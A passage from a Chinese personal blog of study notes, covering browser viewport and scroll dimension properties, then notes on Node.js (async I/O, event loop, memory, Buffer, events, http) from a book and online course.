<h2 id="screen对象"><a href="#screen对象" class="headerlink" title="screen对象"></a>screen对象</h2><p>用于获取用户的屏幕信息。</p>
<ul>
<li><p><code>screen.availWidth</code> 属性返回访问者屏幕的宽度，以像素计，减去界面特性，比如任务栏。</p>
</li>
<li><p><code>screen.availHeight</code> 属性返回访问者屏幕的高度，以像素计，减去界面特性，比如任务栏。</p>
</li>
</ul>
<p>屏幕辨别率的高： <code>window.screen.height</code>;</p>
<p>屏幕辨别率的宽： <code>window.screen.width</code>;</p>
<h2 id="浏览器窗口可视区域大小clientHeight"><a href="#浏览器窗口可视区域大小clientHeight" class="headerlink" title="浏览器窗口可视区域大小clientHeight"></a>浏览器窗口可视区域大小clientHeight</h2><p>获得浏览器窗口的尺寸（浏览器的视口，不包括工具栏和滚动条）的方法:</p>
<h4 id="一、对于IE9-、Chrome、Firefox、Opera-以及-Safari："><a href="#一、对于IE9-、Chrome、Firefox、Opera-以及-Safari：" class="headerlink" title="一、对于IE9+、Chrome、Firefox、Opera 以及 Safari："></a>一、对于IE9+、Chrome、Firefox、Opera 以及 Safari：</h4><ul>
<li><code>window.innerHeight</code> - 浏览器窗口的内部高度</li>
<li><code>window.innerWidth</code>- 浏览器窗口的内部宽度</li>
</ul>
<h4 id="二、对于-Internet-Explorer-8、7、6、5："><a href="#二、对于-Internet-Explorer-8、7、6、5：" class="headerlink" title="二、对于 Internet Explorer 8、7、6、5："></a>二、对于 Internet Explorer 8、7、6、5：</h4><ul>
<li><code>document.documentElement.clientHeight</code>表示HTML文档所在窗口的当前高度。</li>
<li><code>document.documentElement.clientWidth</code>表示HTML文档所在窗口的当前宽度。</li>
</ul>
<p>或者</p>
<p>Document对象的body属性对应HTML文档的<code>&lt;body&gt;</code>标签</p>
<ul>
<li><code>document.body.clientHeight</code></li>
<li><code>document.body.clientWidth</code></li>
</ul>
<h4 id="三、浏览器兼容性"><a href="#三、浏览器兼容性" class="headerlink" title="三、浏览器兼容性"></a>三、浏览器兼容性</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//屏幕可视窗口大小</span></span><br><span class="line"><span class="keyword">var</span> w= <span class="built_in">window</span>.innerWidth||<span class="built_in">document</span>.documentElement.clientWidth|| <span class="built_in">document</span>.body.clientWidth;</span><br><span class="line"><span class="keyword">var</span> h=<span class="built_in">window</span>.innerHeight|| <span class="built_in">document</span>.documentElement.clientHeight || <span class="built_in">document</span>.body.clientHeight;</span><br><span class="line"></span><br><span class="line"><span class="comment">//滚动条滚动的距离</span></span><br><span class="line"><span class="built_in">window</span>.pagYoffset || <span class="built_in">document</span>.documentElement.scrollTop||<span class="built_in">document</span>.body.scrollTop</span><br></pre></td></tr></table></figure>
<h2 id="网页尺寸scrollHeight"><a href="#网页尺寸scrollHeight" class="headerlink" title="网页尺寸scrollHeight"></a>网页尺寸scrollHeight</h2><p><code>scrollHeight</code>和<code>scrollWidth</code>，获取网页内容高度和宽度。</p>
<h4 id="一、针对IE、Opera"><a href="#一、针对IE、Opera" class="headerlink" title="一、针对IE、Opera:"></a>一、针对IE、Opera:</h4><p>scrollHeight 是网页内容实际高度，可以小于 clientHeight。</p>
<h4 id="二、针对NS、FF"><a href="#二、针对NS、FF" class="headerlink" title="二、针对NS、FF:"></a>二、针对NS、FF:</h4><p>scrollHeight 是网页内容高度，不过最小值是 clientHeight。也就是说网页内容实际高度小于 clientHeight 时，scrollHeight 返回 clientHeight 。</p>
<h4 id="三、浏览器兼容性-1"><a href="#三、浏览器兼容性-1" class="headerlink" title="三、浏览器兼容性"></a>三、浏览器兼容性</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> w=<span class="built_in">document</span>.documentElement.scrollWidth|| <span class="built_in">document</span>.body.scrollWidth;</span><br><span class="line"><span class="keyword">var</span> h=<span class="built_in">document</span>.documentElement.scrollHeight|| <span class="built_in">document</span>.body.scrollHeight;</span><br></pre></td></tr></table></figure>
<p><code>scrollHeight</code>和<code>scrollWidth</code>还可获取Dom元素中内容实际占用的高度和宽度。</p>
<h2 id="网页尺寸offsetHeight"><a href="#网页尺寸offsetHeight" class="headerlink" title="网页尺寸offsetHeight"></a>网页尺寸offsetHeight</h2><p><code>offsetHeight</code>和<code>offsetWidth</code>，获取网页内容高度和宽度(包括滚动条等边线，会随窗口的显示大小改变)。</p>
<h4 id="一、值"><a href="#一、值" class="headerlink" title="一、值"></a>一、值</h4><p><code>offsetHeight = clientHeight + 滚动条 + 边框。</code></p>
<h4 id="二、浏览器兼容性"><a href="#二、浏览器兼容性" class="headerlink" title="二、浏览器兼容性"></a>二、浏览器兼容性</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> w= <span class="built_in">document</span>.documentElement.offsetWidth || <span class="built_in">document</span>.body.offsetWidth;</span><br><span class="line"><span class="keyword">var</span> h= <span class="built_in">document</span>.documentElement.offsetHeight|| <span class="built_in">document</span>.body.offsetHeight;</span><br></pre></td></tr></table></figure>
<h2 id="网页卷去的距离与偏移量"><a href="#网页卷去的距离与偏移量" class="headerlink" title="网页卷去的距离与偏移量"></a>网页卷去的距离与偏移量</h2><p>我们先来看看下面的图：</p>
<img src="/study/Comprehensive/visible-area/scroll.png">
<p><code>scrollLeft</code>:设置或获取位于给定对象左边界与窗口中目前可见内容的最左端之间的距离 ，即左边灰色的内容。</p>
<p><code>scrollTop</code>:设置或获取位于对象最顶端与窗口中可见内容的最顶端之间的距离,即网页被卷去的高，即上边灰色的内容。向上滚动的距离</p>
<p><code>offsetLeft</code>:获取指定对象相对于版面或由 offsetParent 属性指定的父坐标的计算左侧位置 。</p>
<p><code>offsetTop</code>:获取指定对象相对于版面或由 offsetParent 属性指定的父坐标的计算顶端位置 。</p>
<p>注意:</p>
<ol>
<li>区分大小写</li>
<li>offsetParent：布局中设置postion属性(Relative、Absolute、fixed)的父容器，从最近的父节点开始，一层层向上找，直到HTML的body。</li>
</ol>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/学习/">学习</a>►<a class="article-category-link" href="/categories/学习/专题笔记/">专题笔记</a>
</div>


  <div class="article-tags">
  
  <span></span> <a href="/tags/面试/">面试</a>
  </div>

</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand post" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/study/2018/7/node.html" title="《深入浅出node.js》、慕课网" itemprop="url">《深入浅出node.js》、慕课网</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="Ruiyu Lin" target="_blank" itemprop="author">Ruiyu Lin</a>
		
  <p class="article-time">
    <time datetime="2018-07-04T16:00:00.000Z" itemprop="datePublished"> Published 2018-07-05</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="《深入浅出node-js》"><a href="#《深入浅出node-js》" class="headerlink" title="《深入浅出node.js》"></a>《深入浅出node.js》</h1><p>适合高并发、IO密集型、事件驱动</p>
<ul>
<li><p>服务端</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">ServerRequest, ServerResponse</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//监听</span></span><br><span class="line">    ServerRequest.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;&#125;)</span><br><span class="line">    ServerRequest.on(<span class="string">'end'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br><span class="line">    ServerRequest.on(<span class="string">'close'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br><span class="line">    <span class="comment">//响应</span></span><br><span class="line">    ServerResponse.writeHead(<span class="number">200</span>,&#123;<span class="string">'Content-Type'</span>:<span class="string">'text/plain'</span>&#125;)</span><br><span class="line">    ServerResponse.write(<span class="string">'hello'</span>)</span><br><span class="line">    ServerResponse.end()</span><br><span class="line">&#125;).listen(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>客户端</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">options = &#123;</span><br><span class="line">    host:<span class="string">''</span>,</span><br><span class="line">    hostname</span><br><span class="line">    localAdrress</span><br><span class="line">    socketPath</span><br><span class="line">    auth</span><br><span class="line">    agent</span><br><span class="line">    keepAlive</span><br><span class="line">    keepAliveMsecs</span><br><span class="line">    port:<span class="string">''</span>,</span><br><span class="line">    method:<span class="string">''</span>,</span><br><span class="line">    path:<span class="string">''</span>,</span><br><span class="line">    headers:<span class="string">''</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> clientRequest = http.request(options,<span class="function"><span class="keyword">function</span>(<span class="params">clientResponse</span>)</span>&#123;</span><br><span class="line">    clientResponse.setEncoding()</span><br><span class="line">    clientResponse.pause()</span><br><span class="line">    clientResponse.resume()</span><br><span class="line">    clientResponse.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(Buffer.isBuffer(chunk));<span class="comment">//true</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> chunk)<span class="comment">//Object</span></span><br><span class="line">    &#125;)<span class="comment">//不断被触发,流</span></span><br><span class="line">    clientResponse.on(<span class="string">'end'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br><span class="line">    clientResponse.on(<span class="string">'close'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">clientRequest.write(请求体)</span><br><span class="line">clientRequest.end()</span><br><span class="line">clientRequest.on(<span class="string">'error'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="built_in">console</span>.log(e.message)&#125;)</span><br><span class="line">clientRequest.abort()</span><br><span class="line">clientRequest.setTimeout()</span><br><span class="line">clientRequest.setNoDelay()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="文件加载方式"><a href="#文件加载方式" class="headerlink" title="文件加载方式"></a>文件加载方式</h2><blockquote>
<p>按路径加载</p>
</blockquote>
<pre><code>require以&apos;/&apos;开头的，以绝对路径方式加载
require以&apos;./&apos;或&apos;../&apos;开头的，以相对路径加载
</code></pre><blockquote>
<p>查找node_modules文件夹</p>
</blockquote>
<pre><code>在当前目录下的node_modules中查找=&gt;
父目录node_modules找=&gt;
上一层目录的node_modules找。。。。。
一层一层向上
</code></pre><h2 id="异步I-O原理"><a href="#异步I-O原理" class="headerlink" title="异步I/O原理"></a>异步I/O原理</h2><p>事实上，javascript是单线程的，<strong>Node自身其实是多线程的</strong>，只是I/O线程使用的CPU较少。<br>除了用户代码无法并行执行外，所有的I/O（磁盘I/O和网络I/O等）都是可以并行执行的。</p>
<img src="/study/2018/7/node/async-io.png">
<h2 id="非I-O异步的方法"><a href="#非I-O异步的方法" class="headerlink" title="非I/O异步的方法"></a>非I/O异步的方法</h2><p>非I/O异步的方法：<code>setTimeout</code>,<code>setInterval</code>,<code>setImmediate</code>,<code>process.nextTick</code></p>
<h3 id="setTimeout-setInterval"><a href="#setTimeout-setInterval" class="headerlink" title="setTimeout,setInterval"></a><code>setTimeout</code>,<code>setInterval</code></h3><p>调用<code>setTimeout</code>,<code>setInterval</code>创建的定时器会被插入到定时器观察者内部的一个红黑树里面。每次Tick执行，就从改红合数中迭代去除定时器对象，检查是否超过定时时间。如果超过，就形成一个事件，回调函数立即执行</p>
<img src="/study/2018/7/node/setTimeout.png">
<h3 id="process-nextTick-VS-setTimeout-function-0"><a href="#process-nextTick-VS-setTimeout-function-0" class="headerlink" title="process.nextTick VS setTimeout(function(){},0)"></a><code>process.nextTick</code> VS <code>setTimeout(function(){},0)</code></h3><p>立即执行一个异步任务可以用<code>process.nextTick</code>。</p>
<p><code>setTimeout(function(){},0)</code>需要动用到红黑树，创建定时器对象和迭代操作等操作，较浪费性能，复杂度为O(lg(n)。</p>
<p>nextTick只会将回调函数放入队列中，在下一轮Tick时取出执行，复杂度为O(1)。</p>
<h3 id="setImmediate-VS-process-nextTick"><a href="#setImmediate-VS-process-nextTick" class="headerlink" title="setImmediate  VS process.nextTick"></a><code>setImmediate</code>  VS <code>process.nextTick</code></h3><p><code>process.nextTick</code>优先级大于 <code>setImmediate</code> 。因为时间循环对观察者的检查是有先后顺序的，<code>process.nextTick</code>属于idle观察者，<code>setImmediate</code>属于check观察者。在每一个时间循环检查中，<strong>观察者检查顺序：idle—I/O—check</strong></p>
<p><code>process.nextTick</code>的回调保存在一个<strong>数组</strong>中。<br><code>setImmediate</code>的回调保存在一个<strong>链表</strong>中</p>
<p><code>process.nextTick</code>在一个事件循环中会将所有回调函数全部执行完。<code>setImmediate</code>每一个时间循环只会执行一个回调。</p>
<h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>对异步方法进行try/catch操作只可以捕获<strong>当次</strong>事件循环里面的异常</p>
<p>solution:Node在处理异常上形成一种约定，将异常作为回调函数的第一个实参传回。</p>
<p>需要睡眠阻塞代码调用setTimeout更好，不要用下面的代码.这段代码会持续占用CPU，与真正的sleep相去甚远<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s =<span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="keyword">while</span>(neW <span class="built_in">Date</span>()-s&lt;<span class="number">100</span>)&#123;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="异步编程解决方案"><a href="#异步编程解决方案" class="headerlink" title="异步编程解决方案"></a>异步编程解决方案</h3><p>EventProxy 是对 events.EventEmitter 的补充，可以自由订阅组合事件</p>
<ul>
<li><p>EventProxy:<br>  all,<br>  tail,<br>  after,<br>  fail,<br>  done(传入all)</p>
</li>
<li><p>promise/deferred</p>
</li>
</ul>
<img src="/study/2018/7/node/promise-deferred.png">
<h4 id="流程控制库"><a href="#流程控制库" class="headerlink" title="流程控制库"></a>流程控制库</h4><ul>
<li><p>async</p>
<p>  series 只适合无依赖的串行执行，若当前一个的结果是后一个调用的输入的时候，就不能满足需求.</p>
<p>  parallel 并行</p>
<p>  waterfall 有依赖的串行执行</p>
<p>  auto 可以根据依赖关系自动分析，以最佳的顺序执行业务</p>
<p>  queue 动态添加并行任务</p>
<p>  parallelLimit 无法动态添加并行任务</p>
</li>
<li><p>step</p>
</li>
<li><p>wind 做到了不阻塞CPU但阻塞代码的目的</p>
</li>
<li><p>bagPipe:对异步API添加过载保护。可以添加任意类型的异步任务，也可以动态添加异步任务，还能够在实时处理场景中加入拒绝模式（若等待的队列也慢了，新来的调用就直接返回一个队列太满的拒绝异常）和超时控制</p>
</li>
</ul>
<h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>V8 的垃圾回收会引起Javascript线程<code>暂停执行</code>，回收的内存越多，时间就会被耽搁得越长。所以造成了V8的内存限制。</p>
<ul>
<li><p>通过赋值方式解除引用更好</p>
<p>  想主动释放变量，可以通过delete或者重新赋值进行删除。但是在V8中delete操作有可能干扰V8的优化，所以通过赋值方式解除引用更好</p>
  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> global.foo ;</span><br><span class="line">global.foo = <span class="literal">undefined</span><span class="comment">//or null</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在正常的Javascript中，无法立即回收的有<code>闭包</code>和<code>全局变量引用</code>这两种情况</p>
</li>
<li><p>闭包<br>  实现外部作用域访问内部作用域变量</p>
<p>  它的问题在于，一旦有变量引用了这个中间函数，这个中间函数将不会释放，同事会使原始的作用域也得不到释放，作用域中产生的内存占用也不会得到释放。除非不再有引用，才会逐步释放</p>
</li>
<li><p>内存</p>
<p>  进程的内存包括rss(常驻内存)、交换区swap中一部分和文件系统中一部分</p>
  <img src="/study/2018/7/node/v8-heap.png">
<p>  Node的内存使用并非都是通过V8进行分配的，那些不是通过V8进行分配的内存叫做 <strong>堆外内存</strong>.利用堆外内存可以突破内存限制</p>
<p> 堆外内存 + v8堆内存(<code>process.memoryUsage()</code>) = rss</p>
<p> Buffer对象不经过V8的内存分配机制</p>
<p> 内存泄露的实质只有一个：就是应当回收的对象出现意外而没有被回收，变成了常驻在老生代中的对象。原因有：</p>
<ol>
<li>缓存（相当于全局变量保存一些东西）保存太多，没有过期淘汰策略。解决方案：使用进程外的缓存，进程自身不存储。</li>
<li>队列消费不及时。解决方案：需要有拒绝策略和超时策略</li>
<li><p>作用域未释放</p>
<p>stream模块用于处理大文件。如果不需要字符串层面的操作，则不需要借助V8来处理，可以尝试纯粹的Buffer来操作，这就不会受到V8的堆内存限制。但是这个大片使用内存的情况依然要小心，即使V8不限制堆内存的大小，物理内存依然有限制</p>
</li>
</ol>
</li>
</ul>
<h2 id="Buffer"><a href="#Buffer" class="headerlink" title="Buffer"></a>Buffer</h2><p>Node在内存的使用上采用的是在C++层面<strong>申请</strong>内存、在Javascript中<strong>分配</strong>内存的策略。</p>
<p>宽字节字符串被截断的问题可以用setEncoding()解决。原因在于，在调用setEncoding()的时候，可读流对象在内部设置了一个decoder对象。每次data事件都通过该decoder对象进行Buffer到字符串的解码，然后再进行下一步。decoder来自于string_decoder模块的StringDecoder实例对象，StringDecoder知道编码后会自行决定输出哪些字节，不输出哪些字节，保证字节不会被截断。但是setEncoding不能从根本上解决该问题。</p>
<p>更好的解决方法是把多个小Buffer对象拼接成一个Buffer对象（concat方法），然后通过iconv-lite一类的模块来转码。</p>
<h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>在node中，TCP默认启用Nagle算法，要求缓冲区的数据达到一定数量或一定时间后才将其发出，所以小数据包会被合并，优化网络。<br>可以调用socket.setNoDelay(true)取消Nagle算法，使得write()可以立即发送数据到网络中。<br>并不是每次write()都会触发一次data事件。在关闭掉Nagle后，另一端可能会将接收到的多个小数据包合并，然后只触发一次data事件.</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>事件驱动的实质：主循环+事件触发</p>
<p>为了充分利用浏览器缓存，提高页面的加载速度，在生产环境中常常会向静态文件的文件名添加MD5戳，即使用bundle_[hash].js,而不是bundle.js。<br>这里的[hash]会在构建时被盖chunk内容的MD5结果替换，以实现内容不变则文件名不变的效果。</p>
<p>幂等 ：重复请求多次与请求一次的效果是一样的。</p>
<p>Node模块分为<strong>核心模块</strong>和<strong>文件模块</strong></p>
<p>文件模块没有扩展名时，会按照顺序优先加上后缀 <code>.js=&gt;.json=&gt;.ndoe</code></p>
<ul>
<li><p>url网址解析</p>
<p>  <code>url.parse(string,bool,bool)</code> URL字符串=&gt;解析对象</p>
<p>  <code>url.format(obj)</code> 解析对象=&gt;URL</p>
<p>  <code>url.resolve(a,b)</code> 连接</p>
</li>
</ul>
<ul>
<li><p>querystring 参数处理小利器</p>
<p>  <code>querystring.parse</code> 字符串=&gt;JSON 反序列化</p>
<p>  <code>querystring.stringify</code> JSON=&gt;字符串 序列化</p>
<p>  <code>querystring.escape</code> 编码转义</p>
<p>  <code>querystring.unescape</code></p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server = <span class="keyword">new</span> HttpServer()</span><br><span class="line"></span><br><span class="line">server.on(<span class="string">'request'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;&#125;)</span><br><span class="line"><span class="comment">//上面一句相当于=&gt;</span></span><br><span class="line">server.listen(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure>
<h1 id="慕课网"><a href="#慕课网" class="headerlink" title="慕课网"></a>慕课网</h1><ul>
<li>DNS查找过程</li>
</ul>
<ol>
<li>浏览器搜索自身的DNS缓存</li>
<li>搜索操作系统自身的DNS缓存</li>
<li>读取本地的HOST文件</li>
<li>浏览器发起一个DNS系统调用</li>
<li>宽带运营商服务器查看本身缓存</li>
<li>运营商服务器发起迭代DNS解析的请求</li>
</ol>
<h3 id="HTTP模块"><a href="#HTTP模块" class="headerlink" title="HTTP模块"></a>HTTP模块</h3><pre><code>什么是回调？
什么是同步/异步？
什么是I/O？
什么是单线程/多线程？
什么是阻塞/非阻塞？
什么是事件？
什么是事件驱动？
什么是基于事件驱动的回调？
什么是事件循环？
</code></pre><h3 id="上下文"><a href="#上下文" class="headerlink" title="上下文"></a>上下文</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pet = &#123;</span><br><span class="line">    speak :<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span> ===pet)<span class="comment">//true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pet</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>===global)<span class="comment">//true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pet</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.word=<span class="string">"miaomiao';</span></span><br><span class="line"><span class="string">    this.speak = function()&#123;</span></span><br><span class="line"><span class="string">        console.log(this)//cat</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">var cat =new pet();</span></span><br></pre></td></tr></table></figure>
<p>this通常指向当前函数的拥有者，叫做执行上下文</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Pet</span>(<span class="params">word</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.word = word;</span><br><span class="line">    <span class="keyword">this</span>.speak = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.word);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Dog</span>(<span class="params">word</span>)</span>&#123;</span><br><span class="line">    Pet.call(<span class="keyword">this</span>,word);<span class="comment">//Pet的this指向当前的Dog,相当于继承</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> dog = <span class="keyword">new</span> Dog(<span class="string">'wang'</span>);</span><br><span class="line">dog.speak()</span><br></pre></td></tr></table></figure>
<h3 id="cheerio"><a href="#cheerio" class="headerlink" title="cheerio"></a>cheerio</h3><p>cheerio可以像jquery一样，解析html代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $ = cheerio.load(html);</span><br><span class="line"><span class="keyword">var</span> chapters = $(<span class="string">'.learnchapter'</span>);</span><br><span class="line">chapters.each(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> c =$(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">var</span> chapterTitle = c.find(<span class="string">'strong'</span>).text();</span><br><span class="line">    <span class="keyword">var</span> vedio = c.find(<span class="string">'.vedio'</span>).children(<span class="string">'li'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<h3 id="events模块"><a href="#events模块" class="headerlink" title="events模块"></a>events模块</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> EventEmitter =<span class="built_in">require</span>(<span class="string">'events'</span>).EventEmitter;</span><br><span class="line"><span class="keyword">var</span> life = <span class="keyword">new</span> EventEmitter();</span><br><span class="line"></span><br><span class="line">life.on(eventname,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="number">1</span>)&#125;);</span><br><span class="line">life.on(eventname,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="number">2</span>)&#125;);</span><br><span class="line">life.on(eventname,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="number">3</span>)&#125;);</span><br><span class="line">life.on(eventname,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="number">4</span>)&#125;);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> haseventname = life.emit(eventname,args)<span class="comment">//返回有没有监听过</span></span><br><span class="line"></span><br><span class="line">life.removeListener(eventname,functionname)<span class="comment">//移除</span></span><br><span class="line">life.removeAllListener(eventname)<span class="comment">//批量移除</span></span><br><span class="line"></span><br><span class="line">life.listeners(eventname)<span class="comment">//所有监听器</span></span><br><span class="line"></span><br><span class="line">EventEmitter.listenerCount(life,eventname)</span><br></pre></td></tr></table></figure>
<p>默认一个事件不要超过10个监听器，不然内容泄露.可以进行设置<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">life.setMaxListeners(<span class="number">0</span>)<span class="comment">//去掉限制</span></span><br><span class="line">life.setMaxListeners(<span class="number">11</span>)<span class="comment">//最多11个</span></span><br></pre></td></tr></table></figure></p>
<h3 id="Buffer暂存"><a href="#Buffer暂存" class="headerlink" title="Buffer暂存"></a>Buffer暂存</h3><p>Buffer 二进制数据。因为JS的字符串是utf-8存储的，处理二进制的能力弱。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> Buffer([<span class="number">1</span>,<span class="number">2.11</span>,<span class="number">3.22</span>,<span class="number">4</span>]);</span><br><span class="line"><span class="built_in">console</span>.log(buf[<span class="number">1</span>])<span class="comment">//2</span></span><br></pre></td></tr></table></figure></p>
